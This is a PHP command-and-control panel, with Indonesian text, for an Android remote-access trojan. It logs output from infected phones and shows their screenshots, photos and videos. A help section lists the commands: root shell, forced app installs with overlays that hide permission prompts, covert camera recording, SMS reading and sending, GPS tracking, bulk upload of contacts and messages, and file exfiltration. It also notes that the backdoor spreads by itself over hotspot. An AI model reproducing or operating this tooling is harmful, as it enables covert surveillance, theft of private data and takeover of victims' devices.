<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalabe=no"/>
    <title>TOOLS beefku 1.1</title>
    <!--[if IE]><script type="text/javascript" src="excanvas.js"></script><![endif]-->
    <!--ubah akura1.1 disini dan pfileman.php untuk meningkatkan versi-->
  </head>
  <body>

    <form action="" method="post">
        <input type="submit" name="btnlog" value="Log">
        <input type="submit" name="btnTarget" value="Select target">
        <?php echo "Path:".dirname(__FILE__); ?>

        <h3><font color='black'>
            SWITCH : 
            <?php
                $rofile = fopen("swthread.txt", "r") or die("Gagal membuka file!");
                $sw = fread($rofile, filesize("swthread.txt"));
                fclose($rofile);

                if ($sw == "hidup") {
                    echo "<font color='red'> hidup </font>";
                    //echo "<script>alert('WARNING super aktif');</script>";
                } else {
                    echo "<font color='blue'> mati </font>";
                }
            ?>

            </font>
        </h3>

        <h3><font color='black'>
            LINK FB : 
            <?php
                $rofile = fopen("swlinkfb.txt", "r") or die("Gagal membuka file!");
                $sw = fread($rofile, filesize("swlinkfb.txt"));
                fclose($rofile);

                if ($sw == "fbhidup") {
                    echo "<font color='red'> hidup </font>";
                    //echo "<script>alert('WARNING super aktif');</script>";
                } else {
                    echo "<font color='blue'> mati </font>";
                }
            ?>

            </font>
        </h3>
        <br><br><br>

        <h3>
            <font color='blue'>
                target : 
                <?php

                if (isset($_GET['target'])) {
                    $target = $_GET['target'];

                    $tfile = fopen("target.txt", "w");
                    fwrite($tfile, $target);
                    fclose($tfile);

                    $rtfile = fopen("target.txt", "r") or die("Gagal membuka file!");
                    echo fread($rtfile, filesize("target.txt"));
                    fclose($rtfile);

                    $rsfile = fopen("swthread.txt", "r") or die("Gagal membuka file!");
                    $sw = fread($rsfile, filesize("swthread.txt"));
                    fclose($rsfile);
                } 
                else {
                    $dir_target = dirname(__FILE__)."/listclient/";
                    echo "<a href='/akura1.1/pfileman.php?folder=".$dir_target."'> select target </a>";

                    $rtfile = fopen("target.txt", "r") or die("Gagal membuka file!");
                    $target = fread($rtfile, filesize("target.txt"));

                    if ($target == "semua") {
                        echo "<b><font color='red'>".$target."</font></b> [WARNING!]";
                    
                    } else {
                        echo "<b><font color='black'>".$target."</font></b>";
                    }
                    fclose($rtfile);
                }

                ?>
            </font>
        </h3>
        

        <h5>input : <?php
            $rifile = fopen('inpayload.txt', 'r') or die('Gagal membuka file!');
            $text = fread($rifile, filesize('inpayload.txt'));
            echo $text;

            fclose($rifile);
            ?>
        </h5>
        <h5>baleni : <?php
            $rifile = fopen('baleni.txt', 'r') or die('Gagal membuka file!');
            $text = fread($rifile, filesize('baleni.txt'));
            echo $text;

            fclose($rifile);
            ?>

        </h5>
        <input type="submit" name="btnSaveBaleni" value="Save Baleni">
        <input type="submit" name="btnListBaleni" value="List Baleni"><br><br>
        <input type="submit" name="btnRefresh" value="Reload..."><br><br>

        <h5>
            <?php

            if (isset($_POST['btnSaveBaleni'])) {
                $save = fopen('baleni.txt', 'r') or die('Gagal membuka file!');
                $data = fread($save, filesize('baleni.txt'));

                $file = fopen("savebaleni.txt", "a");         
                fwrite($file, date("d-m-Y H:i:s").'>>'.$data.'<br>');
                fclose($file);
                echo "<script>alert('History/Baleni disimpan');</script>";
            }   
            if (isset($_POST['btnListBaleni'])) {
                $savebaleni = fopen('savebaleni.txt', 'r') or die('Gagal membuka file!');
                $text = fread($savebaleni, filesize('savebaleni.txt'));
                echo $text."<a href='/akura1.1/payload.php?resethistory='>reset</a>";
            }
            ?>
        </h5>

        <textarea
            name="edt" 
            cols="42" rows="1" 
            tabindex="101" 
            data-wz-state="8" 
            data-min-length="">
        </textarea>
        <input type="submit" name="enter" value="Enter">
        <input type="submit" name="baleni" value="Baleni">
        <br><br>

        <h3>
            -------------------------- OUTPUT ----------<br><br>
            <a href="/akura1.1/payload.php?resetoutpayload=">reset</a> <font color='green'>size: 
            <?php 
                function size($size) {
                    $size = max(0, (int)$size);
                    $units = array( 'b', 'Kb', 'Mb', 'Gb', 'Tb', 'Pb', 'Eb', 'Zb', 'Yb');
                    $power = $size > 0 ? floor(log($size, 1024)) : 0;
                    return number_format($size / pow(1024, $power), 2, '.', ',')." ".$units[$power];
                }
                $logsize = size(filesize(dirname(__FILE__)."/outpayload.txt"));
                echo $logsize;

            ?>
            </font>
            <?php
            $rofile = fopen("outpayload.txt", "r") or die("Gagal membuka file!");
            $odata = fread($rofile, filesize("outpayload.txt"));
            fclose($rofile);
            
            echo "<pre>";
            echo $odata;
            echo "</pre>";

            ?> <br><br>
            -------------------------- OUTPUT -----------

        </h3><br>
        <a href='/akura1.1/payload.php?img=screen.jpg'> show screen</a><br><br>
        <a href='/akura1.1/payload.php?img=foto.jpg'> show foto</a><br><br>
        <a href='/akura1.1/payload.php?video=REC_SYSTEM.mp4'> show video</a><br><br>
        <a href='/akura1.1/fileman.php?folder=payloadout/'> data payload</a><br><br>

    </form>

  </body>
</html>

<?php

function zreadFile($src) {
    $_data = fopen($src, "r") or die("Gagal membuka file!");
    $data = fread($_data, filesize($src));
    fclose($_data);

    return $data;
}

function zwriteFile($src, $data) {
    $_data = fopen($src, "w");
    fwrite($_data, $data);
    fclose($_data);
}

if (isset($_GET['img'])) {
    $dirimg = "payloadout";
    $data = $_GET['img'];
    if ($data == "foto.jpg") {
       echo "<img src='".$dirimg."/foto.jpg'></img>";
    } 
    else {
       echo "<img src='".$dirimg."/screen.jpg'></img>";
    }
}

if (isset($_GET['video'])) {
    $dirvideo = dirname(__FILE__)."/payloadout";

    echo "<video width='320' height='240' controls>";
    echo "<source src='"."payloadout"."/".$_GET['video']."' type='video/mp4'>";
    echo "</video>";
    echo $dirvideo;
}

if (isset($_GET['client'])) {
    $data = $_GET['client'];
    $curdir = dirname(__FILE__)."/listclient";

    unlink($curdir."/".$data);

    $wcfile = fopen("listclient/".$data, "w");
    fwrite($wcfile, $data);
    fclose($wcfile);
}
else if (isset($_GET['inpayloadjson'])) {
    $curdir = dirname(__FILE__);

    $data = ["inpayload" => zreadFile($curdir."/inpayload.txt"),
             "swthread"  => zreadFile($curdir."/swthread.txt"),
             "target"    => zreadFile($curdir."/target.txt"),

            ];

    zwriteFile($curdir."/inpayloadjson.txt", json_encode($data));
}
else if (isset($_GET['resetoutpayload'])) {
    $data = $_GET['resetoutpayload'];

    $ofile = fopen("outpayload.txt", "w");
    fwrite($ofile, $data);
    fclose($ofile);
    header("Location: /akura1.1/payload.php");
}
else if (isset($_GET['resethistory'])) {
    $data = $_GET['resethistory'];

    $ofile = fopen("savebaleni.txt", "w");
    fwrite($ofile, $data);
    fclose($ofile);
    header("Location: /akura1.1/payload.php");
}
else if (isset($_GET['outpayload'])) {
    $data = $_GET['outpayload'];

    $ofile = fopen("outpayload.txt", "a");
    fwrite($ofile, $data);
    fclose($ofile);
}

else if(isset($_GET['inpayload'])) {
    $data = $_GET['inpayload'];

    $file = fopen("inpayload.txt", "w");
    fwrite($file, $data);
    fclose($file);
}
else if(isset($_POST['btnlog'])) {
    header("Location: /akura1.1/pfileman.php");
}
else if(isset($_POST['btnRefresh'])) {
    header("Location: /akura1.1/payload.php");
}
else if(isset($_POST['btnTarget'])) {
    $dir_target = dirname(__FILE__)."/listclient/";
    header("Location: /akura1.1/pfileman.php?folder=".$dir_target);
}


if(isset($_POST['baleni'])) {
    $file = fopen("baleni.txt", "r") or die("Gagal membuka file!");
    $data = fread($file, filesize("baleni.txt"));
    fclose($file);

    echo $data;

    $file = fopen("inpayload.txt", "w");         
    fwrite($file, $data);
    fclose($file);
}
if(isset($_POST['enter'])) {
    $data = $_POST['edt'];
    if ($data == "hidup" || $data == "mati") 
    {
        $file = fopen("swthread.txt", "w");
        fwrite($file, $data);
        fclose($file);
    
    } else if ($data == "fbhidup" || $data == "fbmati") {
        $file = fopen("swlinkfb.txt", "w");
        fwrite($file, $data);
        fclose($file);
    
    } else if($data == "screen") {
        $file = fopen("inpayload.txt", "w");
        fwrite($file, $data);
        fclose($file);

        echo "<img src='payloadout/oke.jpg'></img>";
    
    } else if($data == "bantuan") {
        echo "<b>-_-</b> untuk mode terminal sbg contoh>> <font color='green'><b>-_-ls /sdcard/</b></font> <br><br>".
            "<b>-su-</b> super user terminal sbg contoh>> <font color='green'><b>-su-pm install /sdcard/busybox.apk</b></font> <br><br>".
            
            "<b>-out-</b> handle output contoh>> <font color='green'><b>-out-UTF-16-out-fbaktif/fbmati</b></font> default adalah utf-8 catatan fb digunakan jika out facebook kosong<br><br>".
            
            "<b>-net-</b> handle data selules contoh>> <font color='blue'><b>-net-hidup/mati</b></font> ingat harus root <br><br>".
            
            "<b>-audio-</b> manjalankan musik contogh <font color='blue'><b>-audio-/sdcard/halo.mp3-audio-start/stop</b></font><br><br>".
            
            "<b>-cam-</b> : untuk merekam target contoh <font color='blue'><b>-cam-depan/back</b></font> tambahkan parameter kedua untuk HD video misal <font color='blue'><b>-cam-back-cam-1</b></font> parameter ketiga bisa ditambahkan batas size contoh <font color='blue'><b>-cam-back-cam-1-cam-2142825</b></font> ingat satuanya byte dicontoh adalah 2MB ".
            "jangan lupa masukan perintah <font color='blue'><b>-up-video</b></font> untuk upload hasil rekam<br><br>".
            
            "<b>-foto-</b> : untuk foto target contoh <font color='blue'><b>-foto-depan/back</b></font> untuk on led <font color='blue'><b>-foto-back-foto-led</b></font> jangan lupa masukan perintah <font color='blue'><b>-up-foto</b></font> untuk upload hasil foto <br><br>".
            
            "<b>-foto2-</b> : -foto- kadang gagal save ini alternatinya <font color='blue'><b>-foto2-depan/back</b></font> untuk on led <font color='blue'><b>-foto2-back-foto2-led</b></font> jangan lupa masukan perintah <font color='blue'><b>-up-foto</b></font> untuk upload hasil foto <br><br>".
            
            "<b>-webcam-</b> : rekam live kamera contoh <font color='blue'><b>-webcam-1</b></font> untuk kamera depan default back(0)<br>".
            "bisa untuk atur kualitas contoh <font color='blue'><b>-webcam-1-webcam-80</b></font> default adalah 50<br>".
            "untuk menyalakan led <font color='blue'><b>-webcam-led</b></font> untuk menghentikan menggunkana <font color='blue'><b>-webcam-stop</b></font><br><br>".

            "<b>-wal-</b> : untuk mengganti wallpaper contoh <font color='blue'><b>-wal-/sdcard/image.png</b></font><br><br>".
            
            "<b>-brow-</b> : untuk browsing, mengirim text ke attacker via facebook contoh <font color='blue'><b>-brow-https://frebasics.com</b></font> ini digunakan saat tidak ada kuota <br><br>".
            
            "<b>-browalert-</b> : untuk browsing di service contoh <font color='blue'><b>-browalert-all/text-browalert-https://frebasics.com</b></font> setelah selesai masukan <font color='blue'><b>-brow-stop</b></font> <br><br>".
            
            "<b>-key-</b> : untuk aksi hardware key contoh <font color='blue'><b>-key-home/recent</b></font> catatan beberapa hp harus recent lebih dulu<br><br>".
           
            "<b>-server-</b> : untuk control server contoh <font color='blue'><b>-server-hidup/mati</b></font> catatan untuk mengetahui server run atau tidak gunakan perintah status<br><br>".
            
            "<b>-speech-</b> : untuk suara sintesis contoh <font color='blue'><b>-speech-kalian asik-speech-1</b></font> catatan parameter pertama adalah data suara, kedua adalah kecepatan suara. default adalah 0.9<br><br>".
            
            "<b>-3d-</b> : untuk alert 3d animasi contoh <font color='blue'><b>-3d-/sdcard/maid.obj-3d-0.0023-3d-0.0032-3d-7-3d-4-3d-0-3d-0-3d-0-3d-5</b></font> catatan file .obj bisa dibuat menggunakan blender dilinux untuk <b>parameter pertama letak path obj, kedua camera X, ketiga camera Y, kempat camera zoom, kelima camera rotasi, keenam posisi X, ketujuh posisi Y, lapan posisi Z, dan sembilan skala objek default 2 </b> ingat file obj harus download ke target dulu dan jangan lupa untuk stop <font color='blue'><b>-3d-stop</b></font><br>".
            "bisa juga semua konfigurasi jadikan satu file contoh <font color='blue'><b>-3d-conf-3d-/sdcard/maid.conf</b></font><br>".
            "--------- untuk aturanya adalah sbb: <br>".
            "baris pertama  letak obj contoh <font color='green'>/sdcard/maid.obj</font><br>".
            
            "baris kedua  untuk start camera x, y contoh <font color='green'>0.0023, 0.001</font><br>".
            "baris ketiga  untuk finish camera x, y contoh <font color='green'>0.0026, 0.001</font><br>".
            
            "baris keempat  start posisi x, y, z contoh tengah <font color='green'>0, 0, 0</font><br>".
            "baris kelima  finsih posisi x, y, z contoh bawah <font color='green'>0, -2, 0</font><br>".

            "baris keenam  start zoom contoh <font color='green'>8</font><br>".
            "baris ketujuh  finsih zoom contoh <font color='green'>18</font><br>".

            "baris kelapan  start rotasi contoh <font color='green'>7</font><br>".
            "baris pertama  finsih rotasi contoh <font color='green'>1</font><br><br>".



            "<b>-cekroot-</b> : minta ijin root contoh <font color='blue'><b>-cekroot-cek/paksa/stop</b></font> catatan jika paksa yang digunakan maka akan muncul promp yg menutupi dan jika sudah diijinkan maka panggil stop untuk menghilangkan prompt<br><br>".
            
            "<b>-install-</b> : untuk paksa install aplikasi contoh <font color='blue'><b>-install-/sdcard/nama.apk-install-com.nama.paket</b></font> ini memiliki alert peringatan yang menutupi nama aplikasi dan ijin playstore".
            "<br>install bisa dari data asset contoh <font color='blue'><b>-install-/sdcard/system.apk-install-os.system-install-system.apk</b></font> paramerter ketiga adalah nama file diasset, hasil extrak disimpan di /sdcard/   <b>ingat nama apk harus sama dg parameter ketiga</b><br><br>".
            
            "<b>-uninstall-</b> : untuk uninstall paket contoh <font color='blue'><b>-uninstall-com.myapp</b><br></font><br>".
            
            "<b>-apk2sd-</b> : untuk copy apk ke sdcard contoh <font color='blue'><b>-apk2sd-com.myapp-apk2sd-/sdcard/apps/</b><br></font><br>".
            
            "<b>-app-</b> : untuk membuka aplikasi contoh <font color='blue'><b>-app-com.busybox</b></font><br><br>".

            "<b>-sms-</b> : untuk aksi sms contoh baca<font color='blue'><b>-sms-baca</b></font> untuk kirim <font color='blue'><b>-sms-isi_pesan-sms-082324379134</b></font><br><br>".
            
            "<b>-zip-</b> : untuk kompres folder ke zip contoh <font color='blue'><b>-zip-/sdcard/anime-zip-/sdcard/anime.zip</b></font> catatan file dg nama yang sama akan ditimpa<br><br>".
            
            "<b>-facebook-</b> : untuk aktifkan remote facebook free contoh <font color='blue'><b>-facebook-hidup/mati/status</b></font> catatan semua data harus sudah terdownload<br><br>".
            
            "<b>-siapa-</b> : untuk lihat dan edit siapa hp ini contoh <font color='blue'><b>-siapa-ini</b></font> defaultnya adalah unknown untuk merubah <font color='blue'><b>-siapa-edit-siapa-muhamad</b></font><br><br>".

            "<b>-up-</b> : untuk upload file contoh <font color='blue'><b>-up-/sdcard/penting.txt</font></b> file disimpan di server folder payloadout. tambahan upload video/audio dan gambar contoh <font color='blue'><b>-up-video/screen/foto</b></font><br><br>".
            
            "<b>-down-</b> : untuk download file contoh <font color='blue'><b>-down-exe_hapus.sh-down-/sdcard/data</font></b> file exe_hapus.sh akan disimpan di /sdcard/data [target] ".
            "parameter pertama bisa link misal <font color='blue'><b>-down-https://drive.google.KHGHJgGg-down-/sdcard/data-down-busybox.apk</b></font> INGAT parameter ketiga harus diisi nama file<br><br>".
            
            "<b>screen</b> : upload screenshoot INGAT harus root<br><br>".
            
            "<b>layar</b> : menyalakan layar dari tidur<br><br>".
            
            "<b>status</b> : melihat status switch, server, batery dll<br><br>".
            
            "<b>gps</b> : mencari lokasi target <br><br>".
            
            "<b>-/-</b> : menyimpan text contoh <font color='blue'><b>-/-ini text yang disimpan-/-test.txt</b></font> tersimpan difolder default yaitu Andoid/data/com.runtime.android.system<br><br>".
            
            "<b>-alert-</b> : toast paksa contoh <font color='blue'><b>-alert-text pesan-alert-warna-alert-letak-alert-1000</b></font> parameter letak: atas/bawah/tengah atau atas&tengah/bawah&tengah<br>  paramter warna: biru/merah/kuning/hijau ".
            "untuk memakai default adalah warna [kuning] letak [atas] waktu [7.5 detik(7500)] contoh <font color='blue'><b>-alert-pesawat terbang</b></font>".
            " untuk alert image contoh <font color='blue'><b>-alert-?img?-alert-/sdcard/setan.jpg-alert-letak-alert-3000</b></font><br><br>".
            
            "<b>alert</b> : mengetes terhubung atau tidak<br><br>".

            "<b>ping</b> : hp terhubung ke google atau tidak true berarti terhubung<br><br>".

            "<b>semua</b> : upload semua informasi seperti inbox,contack,system,dll<br><br>".
            
            "<b>fbhidup/fbmati</b> : jika halaman facebook terhapus aktifkan ini untuk memperbarui link catatan link harus sudah ditulis di configure.php<br><br>".
            
            "<b>hidup/mati</b> : download install server, mode super atau menghidupkan fitur paksa misal install apk update apk root dll, catatan : backdoor akan ".
            "             akan otomatis tersebar via hotspot jadi hati2 untuk menghidupkan mode ini,<br><br><br>".
            "petunjuk offline mode: <br><br>".
            "* gunakan facebook lite android atau akses 0.facebook.com<br>".
            "* masuk pesan dan cari Ali ku<br>".
            "* untuk perintahnya contoh: <br><font color='blue'><b>-target-10.42.0.32-target-<br>-aksi-alert-aksi-</b></font><br>".
            "* untuk aksi gunakan perntah standar contoh: <br>".
            "* <b>-aksi-gps-aksi-</b><br>".
            "* <b>-aksi--wal-/sdcard/anime.jpg-aksi-";
    } 
    else 
    {

        $file = fopen("inpayload.txt", "w");         
        fwrite($file, $data);
        fclose($file);

        $file = fopen("baleni.txt", "w");         
        fwrite($file, $data);
        fclose($file);

        echo $data;
    }
}

?>


